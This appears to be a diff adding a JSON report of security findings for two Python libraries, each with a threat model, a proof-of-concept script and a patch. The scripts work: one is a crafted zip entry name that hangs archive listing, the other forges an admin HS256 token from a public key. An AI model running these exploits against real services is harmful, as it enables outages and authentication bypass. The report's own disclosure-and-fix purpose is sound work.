@@ -1,0 +1,55 @@
+{
+  "validator_verdict": "confirmed",
+  "hunts": {
+    "ziptree/resource-exhaustion-and-availability": [
+      {
+        "id": "ancestry-dos",
+        "verdict": "needs_validation",
+        "title": "Unbounded loop on zip entry names with repeated leading separators",
+        "attack_class": "resource-exhaustion-and-availability",
+        "severity": "high",
+        "threat_model": {
+          "attacker": "attacker who supplies the zip archive",
+          "boundary": "a crafted entry name makes path enumeration loop forever"
+        },
+        "location": {
+          "file": "ziptree/__init__.py",
+          "line": 56,
+          "symbol": "_ancestry"
+        },
+        "description": "_ancestry() stops only when the path equals a single separator, so a name beginning with repeated separators never reduces and the loop never ends, hanging any listing of the archive.",
+        "poc": {
+          "kind": "script",
+          "content": "import sys, io, zipfile, threading, os\nsys.path.insert(0, '.')\nimport ziptree\nbuf = io.BytesIO()\nwith zipfile.ZipFile(buf, 'w') as zf:\n    zf.writestr('//a/b', 'x')\nbuf.seek(0)\ndef go():\n    list(ziptree.Path(buf).iterdir())\nt = threading.Thread(target=go, daemon=True)\nt.start(); t.join(3.0)\nif t.is_alive():\n    print('DOS_HANG', flush=True); os._exit(0)\nprint('completed'); sys.exit(1)\n",
+          "observed": "DOS_HANG"
+        },
+        "patch": "-    while path and path != posixpath.sep:\n+    while path and not path.endswith(posixpath.sep):"
+      }
+    ],
+    "tokenlib/web-protocol-and-auth": [
+      {
+        "id": "hmac-key-confusion",
+        "verdict": "needs_validation",
+        "title": "Asymmetric public key accepted as an HMAC secret",
+        "attack_class": "web-protocol-and-auth",
+        "severity": "critical",
+        "threat_model": {
+          "attacker": "attacker who knows the service's public verification key",
+          "boundary": "a public key is accepted as a symmetric HMAC secret, enabling token forgery"
+        },
+        "location": {
+          "file": "tokenlib/algorithms.py",
+          "line": 193,
+          "symbol": "prepare_key"
+        },
+        "description": "HMACAlgorithm.prepare_key rejects only a fixed list of key markers, so a public key in another format (e.g. an ssh-ed25519 key) is accepted as the HMAC secret; anyone holding the public key can then forge HS256 tokens.",
+        "poc": {
+          "kind": "script",
+          "content": "import sys\nsys.path.insert(0, '.')\nimport tokenlib as jwt\npub = ('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGb9ECWmEzf6FQbrBZ9w7lshQhqowgb'\n       'qHtjdQyfp2VTO user@host')\ntry:\n    token = jwt.encode({'admin': True}, pub, algorithm='HS256')\nexcept Exception as exc:\n    print('rejected:', type(exc).__name__); sys.exit(1)\ndata = jwt.decode(token, pub, algorithms=['HS256'])\nassert data.get('admin') is True, 'verify failed'\nprint('KEYCONF_OK')\n",
+          "observed": "KEYCONF_OK"
+        },
+        "patch": "-        invalid_strings = [\n-            b\"-----BEGIN PUBLIC KEY-----\",\n-            b\"-----BEGIN CERTIFICATE-----\",\n-            b\"-----BEGIN RSA PUBLIC KEY-----\",\n-            b\"ssh-rsa\",\n-        ]\n-\n-        if any(string_value in key for string_value in invalid_strings):\n+        if key.lstrip().startswith(b\"ssh-\") or b\"-----BEGIN\" in key:"
+      }
+    ]
+  }
+}
